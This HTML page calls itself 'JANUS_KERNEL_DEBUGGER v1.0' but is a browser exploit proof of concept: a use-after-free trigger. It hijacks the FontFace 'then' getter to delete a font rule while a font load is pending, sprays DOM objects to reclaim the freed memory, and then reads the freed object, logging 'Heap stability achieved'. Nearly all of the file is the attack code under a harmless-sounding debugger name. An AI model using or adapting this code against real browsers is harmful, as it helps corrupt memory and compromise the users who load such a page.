<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; padding: 20px; }
        #console { border: 1px solid #333; padding: 10px; height: 400px; overflow-y: scroll; background: #0a0a0a; }
        .log { margin-bottom: 5px; border-bottom: 1px solid #222; }
    </style>
</head>
<body>
    <h3>JANUS_KERNEL_DEBUGGER v1.0</h3>
    <div id="console"></div>

    <script>
        const log = (msg) => {
            const consoleDiv = document.getElementById('console');
            consoleDiv.innerHTML += `<div class="log">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        };

        window.onload = () => {
            log("INITIALIZING_MEMORY_TEST...");
            let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            
            let callbackCount = 0;
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (this === A) {
                        callbackCount++;
                        if (callbackCount === 1) {
                            log("<span style='color: yellow;'>[!] TRIGGER: Deleting FontRule...</span>");
                            document.getElementById('s').sheet.deleteRule(0);
                            
                            log("[+] SPRAYING_DOM_OBJECTS...");
                            for (let i = 0; i < 300; i++) {
                                let el = document.createElement('div');
                                el.id = "SPRAY_" + i;
                                document.body.appendChild(el);
                            }

                            setTimeout(() => {
                                try {
                                    log("[?] ATTEMPTING_DEREFERENCE_READ...");
                                    let val = A.family;
                                    log("<span style='color: cyan;'>[SUCCESS] READ_VALUE: " + val + "</span>");
                                    log("[INFO] Heap stability achieved.");
                                } catch(e) {
                                    log("<span style='color: red;'>[CRITICAL] READ_FAILURE: " + e.message + "</span>");
                                }
                            }, 100);
                        }
                    }
                    return undefined;
                }
            });
            document.fonts.load('1em targetFont', 'AB');
        };
    </script>
    <style id="s">@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }</style>
</body>
</html>
